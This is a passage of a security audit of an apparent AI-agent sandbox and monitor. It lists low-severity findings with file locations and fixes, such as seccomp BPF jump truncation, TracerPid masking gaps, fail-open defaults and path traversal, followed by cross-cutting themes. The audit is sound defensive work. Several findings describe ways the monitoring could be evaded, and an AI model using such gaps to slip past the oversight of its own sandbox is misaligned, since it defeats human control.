- **Where:** `internal/report/markdown.go` (`FormatMarkdown`, `formatTopN`, `formatNumber` ~210)
- **Issue:** Agent/event-controlled strings (paths, domains, commands, `b.Rule`/`b.Message`, tool names) interpolated with `fmt.Sprintf` and backtick-wrapped with no escaping of `|`, newlines, backticks.
- **Fix:** Escape `|`→`\|`, newlines→space, backticks for table cells; validate before backtick-wrapping; handle negatives in `formatNumber`.

### L14. Score 3 — BPF `Jt`/`Jf` jump offsets are `uint8`; overflow with many rules
- **Where:** `internal/ptrace/seccomp_filter.go` (`jumpTarget := uint8(...)` in `buildBPFForActions`/`buildBPFWithArgFilters`)
- **Issue:** Classic BPF jump offsets are 8-bit; if `len(actions)` + check-block offsets exceed 255, the `uint8(...)` cast silently truncates → incorrect jump target (could misroute a syscall to `ALLOW` instead of `TRACE`/`ERRNO`). Current rule counts small, but config-driven growth could trip it silently.
- **Fix:** Validate total program/instruction reach ≤ 255 and fail filter construction otherwise, or use a BPF assembler that emits absolute jumps.

### L15. Score 3 — `rewriteSNI` updates 16-bit length fields without overflow check
- **Where:** `internal/ptrace/sni.go:208-245` (`uint16(recordLen)`, `uint16(listLen)`, `uint16(extLen)`)
- **Issue:** If the rewritten ClientHello (with a long replacement SNI) exceeds 65535 bytes, the `uint16` casts silently truncate TLS record/handshake/extension length fields, corrupting the record.
- **Fix:** Reject rewrites where any computed length exceeds 0xFFFF; fall back to allowing the original ClientHello.

### L16. Score 3 — `handleReadExit` TracerPid masking misses chunk-boundary splits
- **Where:** `internal/ptrace/handle_read.go:31-39` (`bytes.Contains(buf, tracerPidPrefix)`)
- **Issue:** If the tracee reads `/proc/self/status` in small chunks such that `"TracerPid:\t"` straddles two reads, neither chunk contains the full prefix and masking is skipped.
- **Fix:** Carry a small tail buffer across reads of the same fd, or mask at open time.

### L17. Score 3 — Secret cache unbounded; secrets never zeroed
- **Where:** `pkg/secrets/cache.go`
- **Issue:** No max-size cap (growth between `ttl/2` cleanup sweeps); `Secret.Data` string values never overwritten/zeroed on eviction.
- **Fix:** Add a size cap and best-effort zeroing.

### L18. Score 3 — `newSecretCache` panics on tiny `CacheTTL`
- **Where:** `pkg/secrets/cache.go` (~38: `time.NewTicker(c.ttl / 2)`)
- **Issue:** Panics for `c.ttl` of a few nanoseconds (integer division → 0).
- **Fix:** Guard against sub-minimum TTL.

### L19. Score 3 — OIDC discovery has no applied timeout; token cache unbounded
- **Where:** `internal/auth/oidc.go` (`NewOIDCAuth` ~60 ignores `DiscoveryTimeout`; `ValidateToken` cache grows, cleaned only on writes)
- **Fix:** Pass a timeout context to `oidc.NewProvider`; bound the cache.

### L20. Score 3 — `isPathAllowed` allow-by-default for unknown providers
- **Where:** `pkg/secrets/manager.go` (~418)
- **Issue:** The provider switch only knows `vault`/`aws`/`azure`; a registered provider with any other name falls through to the struct check and, if no built-in provider struct is set, returns `true`.
- **Fix:** Default-deny unknown provider names.

### L21. Score 3 — `agentmon-macwrap` SBPL profile string-interpolation incomplete escaping
- **Where:** `cmd/agentmon-macwrap/profile.go` (`escapePath` only replaces `\` and `"`; paths via `(subpath "%s")`)
- **Issue:** `"` is escaped so string breakout is blocked, but control chars / newlines in `WorkspacePath`/`AllowedPaths` are not rejected and could confuse the seatbelt parser if any path is attacker-influenced.
- **Fix:** Reject or fully-escape control chars; prefer `%q`-style quoting.

### L22. Score 3 — `agentmon-macwrap` `os.Remove` arbitrary-path delete; `os.ReadFile` follows symlinks
- **Where:** `cmd/agentmon-macwrap/config.go` (`os.ReadFile(filePath); os.Remove(filePath)` where `filePath` from env)
- **Fix:** Open with `O_NOFOLLOW` + verify ownership/perm before read; don't `os.Remove` arbitrary env paths. `[needs verification: server file perms/location]`

### L23. Score 3 — `agentmon-stub` proxy trusts the server conn and well-known fd 100 / `AGENTMON_STUB_FD` from env
- **Where:** `cmd/agentmon-stub/main.go` (`runWithFD`, `wellKnownStubFD = 100`), `internal/stub/proxy.go` (`RunProxy`)
- **Issue:** `RunProxy` writes server-supplied payloads to the stub's stdout/stderr and trusts the exit code; the conn comes from an env fd or fd 100. `ReadFrame` may accept unbounded frame sizes.
- **Fix:** Validate the fd is a socket/pipe from the expected peer; cap frame size in `ReadFrame`.

### L24. Score 3 — `killCommand`'s deferred hard-kill is fire-and-forget and PID-reuse-prone
- **Where:** `internal/api/app.go` (`killCommand`), `internal/api/grpc.go` (`KillCommand`)
- **Issue:** `go func() { time.Sleep(2s); _ = killProcessHard(pid) }()` not tied to the command lifecycle; if the command exits first, the later `Kill(-pid, SIGKILL)` can hit a reused process group.
- **Fix:** Cancel the goroutine when `CurrentProcessPID` clears / the command exits; re-check PID identity before the hard kill.

### L25. Score 3 — Windows kill terminates only the single PID; children survive
- **Where:** `internal/api/process_windows.go` (`killProcess`, `killProcessGroup`)
- **Issue:** `killProcessGroup(pgid)` just calls `killProcess(pgid)` → `TerminateProcess` on the leader. Windows has no Unix process groups; Job Objects aren't used.
- **Fix:** Create the command under a Job Object (`CREATE_BREAKAWAY_FROM_JOB`/`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) in `getSysProcAttr`.

### L26. Score 3 — Notify/signal socketpair FDs rely on finalizers on pre-start error paths
- **Where:** `internal/api/exec.go`, `internal/api/exec_stream.go` (pipe-creation + `cmd.Start()` failure branches)
- **Issue:** `notifyParentSock`/`signalParentSock` and their child ends "left to their finalizers" per the code comment; finalizer-based FD reclamation is fragile under GC pressure / sustained failure rates.
- **Fix:** Add an explicit `closeExtraSockets(extra)` on the pre-`cmd.Start` error paths.

### L27. Score 3 — `DefaultSafeFunctionAllowlist` includes non-immutable functions
- **Where:** `internal/db/classify/postgres/builtins/allowlist.go`
- **Issue:** Documents itself as "immutable" but includes `random` (volatile), `nextval`/`currval`/`lastval` (sequence-mutating), `timeofday` (volatile).
- **Fix:** Remove volatile/mutating entries or correct the docstring.

### L28. Score 3 — `FunctionOID` stored as `int32`, truncating OIDs > 2³¹
- **Where:** `internal/db/proxy/postgres/funccall.go` (`oid := int32(msg.Function)`)
- **Fix:** Store/emit as `uint32` end-to-end.

### L29. Score 3 — `hasFilter` always returns `false` in events
- **Where:** `internal/db/proxy/postgres/eventbuilder.go` (`hasFilter` returns false with a TODO)
- **Fix:** Thread `HasWhere` from the statement's primary effect into `EventPredicates.HasFilter`.

### L30. Score 3 — `execPTY` stdin goroutine not context-cancellable (leak)
- **Where:** `internal/cli/exec_pty.go` (`execPTYGRPC`/`execPTYWS` stdin goroutines)
- **Fix:** Close `os.Stdin` / use a non-blocking reader on context cancel so the goroutine unblocks on shutdown.

### L31. Score 3 — `backup restoreBackup` doesn't switch on `Typeflag`
- **Where:** `internal/cli/backup.go` (`restoreBackup`)
- **Issue:** Path traversal handled (`sanitizeTarPath`), but every entry treated as a regular file via `OpenFile(...,O_CREATE|O_TRUNC, FileMode(header.Mode))` + `io.Copy`; symlink/hardlink/device/fifo entries not rejected; `header.Mode` applied verbatim incl. setuid/setgid.
- **Fix:** Switch on `header.Typeflag`; only process `TypeReg`/`TypeRegOld` (maybe `TypeDir`); mask mode bits to a safe subset.

### L32. Score 3 — `audit_chain` reset double-unlock on error path
- **Where:** `internal/cli/audit_chain.go` (`resetIntegrityChain`)
- **Issue:** On the error path `lockFile` stays non-nil and `inner.Close()` has already run — if `NewWithLock`/`inner.Close()` takes ownership of releasing the lock, the outer `closeAndUnlockAuditFile` double-unlocks.
- **Fix:** Clarify ownership in `jsonl.NewWithLock`; set `lockFile = nil` before returning on all paths. `[needs verification: jsonl ownership semantics]`

### L33. Score 3 — `llm_logs`/`report` `sessionID` path traversal
- **Where:** `internal/cli/llm_logs.go` (`GetSessionLLMLogPath`), `internal/cli/report.go` (`--sessions-dir`)
- **Issue:** `filepath.Join(sessionsDir, sessionID, "llm-requests.jsonl")` uses `sessionID` straight from CLI args; `filepath.Join` cleans, so `../../etc/x` resolves outside `sessionsDir`. Low (self-inflicted today) but an unsanitized ID into a fs path is worth hardening.
- **Fix:** Validate `sessionID` against `^[A-Za-z0-9_-]+$` before joining, or `filepath.Rel`-check the result stays within `sessionsDir`.

### L34. Score 2 — `os.ExpandEnv` on raw YAML
- **Where:** `internal/config/config.go` (`Load`/`LoadWithSource`)
- **Issue:** Expanding env vars before YAML parse can mangle `$`-bearing values (e.g. regex anchors in `dns_redirects.match`) and lets env values inject into YAML.
- **Fix:** Expand only inside designated fields.

### L35. Score 2 — Shim debug logging echoes `os.Args` and `PATH` to stderr
- **Where:** `cmd/agentmon-shell-shim/main.go` (`fatalWithHint` debug block, `debugLog`)
- **Fix:** Redact argv in debug output or require an explicit opt-in flag.

### L36. Score 2 — `PinStore` DB perms + `VerifyBinary` ignores path; `Allow(serverID, toolName)` ignores `toolName`
- **Where:** `internal/mcpinspect/pins.go:43` (`MkdirAll(…,0o755)`, default DB file perms), `:208-216` (`VerifyBinary` checks hash only), `internal/mcpinspect/ratelimit.go:23-28`
- **Fix:** Create the DB dir `0o700` + file `0o600`; record/verify path alongside hash; either use `toolName` in `Allow` or rename the API.

### L37. Score 2 — Wrap-mode handlers use `context.Background()`, outliving session destroy
- **Where:** `internal/api/wrap.go` (`wrapInitCore` passes `ctx := context.Background()`), `internal/api/wrap_linux.go` (`acceptNotifyFD`, `acceptPtracePID`, `acceptSignalFD`)
- **Fix:** Derive the wrap handler context from a per-session cancellable context stored on the session, cancelled in `Session.cleanup()`.

---

## Cross-cutting themes (worth fixing as a class)

- **Fail-open-when-engine/handler-nil:** H5, plus policy-store/secret-cache gaps — a missing/nil enforcement component should always default to deny in a security product.
- **Seccomp-notify fd CLOEXEC / leak:** M1, M2, L1 — receive with `MSG_CMSG_CLOEXEC`, set `O_CLOEXEC`, never rely on `defer` across `syscall.Exec`, never `dup2` a fixed fd.
- **DNS rebinding / IP-vs-hostname policy gap:** M3 — resolve through the agent's interceptor and evaluate CIDR on the resolved IP at the actual connect site.
- **Unbounded maps/goroutines (resource-exhaustion DoS):** H12, M17, M18, M21, M22, M51, L9, L17, L19 — add caps/LRU/semaphores and evict on session/process end.
- **Blocking-I/O shutdown deadlocks:** H6, M13, M24, M26, M34, M39, L7 — close the handle/port/conn before `wg.Wait()`, use ctx-driven deadlines on blocking reads.
- **Secret leakage to logs/storage:** H1, H11, M20, M36, L35 — redact headers/args, store pre-hook bodies, zero caches, never forward keys to env-controlled hosts.
- **Supply-chain / classifier bypass via partial failure:** C4, H21, M56, L6 — treat partials as provider errors; run unsafe-IO / function walkers over all statement types and all nested expression nodes.

---

## Notes / confidence

- Several items are marked `[needs verification]` where the reviewer couldn't confirm a call site in their isolated scope (e.g. `NewEngine` flag wiring, `kernelinstall.Install` internals, `Allowlist.IsAllowed` call-site, `jsonl.NewWithLock` ownership, whether `SessionShutdown` is in a live path, the active macOS SBPL profile). These are worth a quick confirming pass with `grep`/`go vet`/tests before committing to a fix.
- Findings with the same root cause across subsystems (e.g. fail-open-on-nil-engine) were consolidated; the per-subsystem raw reports contain additional minor/low-confidence items not repeated here.
- No code was modified; this is a read-only audit. Recommend fixing Critical→High first, then running the test suite + `go vet ./...` + `GOOS=windows go build ./...` after each batch.
